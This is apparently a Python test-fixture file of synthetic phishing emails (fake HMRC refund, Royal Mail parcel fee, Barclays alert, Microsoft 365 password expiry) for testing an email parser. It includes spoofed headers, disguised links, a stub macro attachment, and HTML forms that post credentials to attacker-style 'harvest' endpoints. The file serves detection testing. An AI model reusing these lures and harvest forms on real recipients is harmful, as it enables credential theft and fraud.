"""
sample_emails.py
----------------
Realistic (synthetic) phishing email samples for testing the parser.
These are fabricated for educational/testing purposes only.
"""

# Sample 1: Classic HMRC tax refund phish
# Tactics: display name spoofing, urgency, credential lure, suspicious URL
HMRC_PHISH = """From: "HM Revenue & Customs" <noreply@hmrc-gov-uk.support-portal.com>
Reply-To: refunds@hmrc-verify-taxrefund.net
Return-Path: <bounce@mailout99.sendgrid-marketing.info>
To: recipient@example.co.uk
Subject: URGENT: You have a pending tax refund - Action Required Within 24 Hours
Date: Mon, 28 Mar 2024 09:15:32 +0000
Message-ID: <20240328091532.abc123@mailout99.sendgrid-marketing.info>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="----=_Part_1234"
X-Originating-IP: 185.234.219.45

------=_Part_1234
Content-Type: text/plain; charset=UTF-8

Dear Taxpayer,

URGENT ACTION REQUIRED within 24 hours.

Our records show you are eligible for a tax refund of GBP 312.50 for the tax year 2023/2024.

To claim your refund immediately, you must verify your details and confirm your bank account. 
Your account will be suspended if you do not act now.

Please verify your identity here: http://185.234.219.45/hmrc/verify?ref=UK2024&token=a7f3b2

If you fail to complete verification, your refund will be cancelled and your National Insurance 
number may be flagged for investigation by law enforcement.

HMRC Customer Services

------=_Part_1234
Content-Type: text/html; charset=UTF-8

<html><body>
<p>Dear Taxpayer,</p>
<p><strong>URGENT ACTION REQUIRED</strong> within 24 hours.</p>
<p>Our records show you are eligible for a <strong>tax refund of GBP 312.50</strong> for the tax year 2023/2024.</p>
<p>Your account will be <strong>suspended</strong> immediately if you do not act now.</p>
<p>Please <a href="http://185.234.219.45/hmrc/verify?ref=UK2024&token=a7f3b2">click here to verify your credentials and claim your refund</a>.</p>
<p>Confirm your: password, date of birth, national insurance number, bank details, credit card number.</p>
<p>If you fail to complete this process your case will be escalated to law enforcement.</p>
<form action="http://185.234.219.45/hmrc/harvest" method="POST">
<input type="hidden" name="victim" value="1"/>
</form>
<p>HM Revenue &amp; Customs</p>
</body></html>
------=_Part_1234--
"""


# Sample 2: Parcel delivery phish (Royal Mail / Evri style)
# Tactics: URL shortener, urgency, brand impersonation, suspicious attachment
PARCEL_PHISH = """From: "Royal Mail Delivery" <deliveries@royalmail-parcels.delivery-confirm.net>
To: customer@example.co.uk
Subject: Your parcel is waiting - delivery fee required
Date: Mon, 28 Mar 2024 14:22:10 +0000
Message-ID: <xyz987@royalmail-parcels.delivery-confirm.net>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Boundary_5678"

------=_Boundary_5678
Content-Type: text/html; charset=UTF-8

<html><body>
<p>We attempted to deliver your parcel but were unable to complete delivery.</p>
<p>A small customs fee of GBP 1.99 is outstanding. Your parcel will be returned if payment is not made within 48 hours.</p>
<p>Pay now: <a href="https://bit.ly/3xRoyalMail">https://royalmail.com/track-parcel</a></p>
<p>Alternatively confirm your address: <a href="https://bit.ly/4fParcelUK">click here</a></p>
<p>Royal Mail Group Ltd</p>
</body></html>

------=_Boundary_5678
Content-Type: application/vnd.ms-excel; name="delivery_form.xlsm"
Content-Disposition: attachment; filename="delivery_form.xlsm"
Content-Transfer-Encoding: base64

UEsDBBQABgAIAAAAIQA=

------=_Boundary_5678--
"""


# Sample 3: Bank security alert phish  
# Tactics: display name spoof, reply-to mismatch, credential harvest, HTML mismatch
BARCLAYS_PHISH = """From: "Barclays Security Team" <security-alerts@barclays-secure-verify.com>
Reply-To: noreply@barclays-auth.top
To: account.holder@example.co.uk
Subject: [Important] Unusual sign-in activity detected on your account
Date: Mon, 28 Mar 2024 11:05:00 +0000
Message-ID: <sec001@barclays-secure-verify.com>
X-Mailer: PHPMailer 5.2.9
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8

<html><body>
<p>Dear Valued Customer,</p>
<p>We have detected <strong>unusual activity</strong> on your Barclays account.</p>
<p>Your account has been <strong>temporarily blocked</strong> for your security.</p>
<p>To restore access, please verify your identity immediately:</p>
<p><a href="https://barclays-secure-verify.com/auth/login?session=fake123">https://www.barclays.co.uk/online-banking/login</a></p>
<p>You must sign in and confirm your password and security code within 2 hours or your account will be permanently suspended.</p>
<p>Barclays Bank PLC</p>
</body></html>
"""


# Sample 4: Microsoft 365 credential harvest
# Tactics: typosquatting, HTML form, credential lure, free email sender
MICROSOFT_PHISH = """From: "Microsoft 365 Team" <admin@microsofft-365-admin.onmicrosoft-support.com>
To: employee@targetcompany.co.uk
Subject: Your Microsoft 365 password expires today - update required
Date: Mon, 28 Mar 2024 08:00:00 +0000
Message-ID: <ms365@outlook.com>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="----=_MS365"

------=_MS365
Content-Type: text/plain; charset=UTF-8

Your Microsoft 365 account password will expire today.

Please update your credentials immediately to avoid losing access to your email and files.

Update password: https://microsofft-365-admin.onmicrosoft-support.com/login/update?user=employee@targetcompany.co.uk

------=_MS365
Content-Type: text/html; charset=UTF-8

<html><body>
<h2>Microsoft 365 - Password Expiry Notice</h2>
<p>Your password for employee@targetcompany.co.uk <strong>expires today</strong>.</p>
<form action="https://microsofft-365-admin.onmicrosoft-support.com/harvest" method="POST">
  <p>Email: <input type="text" name="email" value="employee@targetcompany.co.uk"/></p>
  <p>Current Password: <input type="password" name="password"/></p>
  <p>New Password: <input type="password" name="new_password"/></p>
  <input type="submit" value="Update Password"/>
</form>
</body></html>
------=_MS365--
"""

ALL_SAMPLES = {
    "hmrc_refund": HMRC_PHISH,
    "parcel_delivery": PARCEL_PHISH,
    "barclays_security": BARCLAYS_PHISH,
    "microsoft_365": MICROSOFT_PHISH,
}
